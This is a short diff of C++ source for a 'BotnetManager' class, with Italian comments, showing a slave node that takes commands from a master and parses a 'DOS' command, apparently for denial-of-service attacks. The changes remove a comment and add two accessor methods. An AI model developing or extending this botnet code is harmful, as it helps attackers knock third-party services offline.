@@ -85,7 +85,6 @@ void BotnetManager::slaveConnector() {
                     std::string cmd(buffer);
                     Utils::logWarning("Comando ricevuto dal master: " + cmd);
                     
-                    // Esegui comando
                     if (cmd.find("DOS") == 0) {
                         auto parts = Utils::split(cmd, ' ');
                         if (parts.size() >= 3) {
@@ -128,4 +127,12 @@ void BotnetManager::stop() {
     if (listener_thread.joinable()) listener_thread.join();
     if (slave_thread.joinable()) slave_thread.join();
     close(master_socket);
+}
+
+bool BotnetManager::isMaster() const { 
+    return g_is_master.load(); 
+}
+
+bool BotnetManager::isSlave() const { 
+    return g_is_slave.load(); 
 }
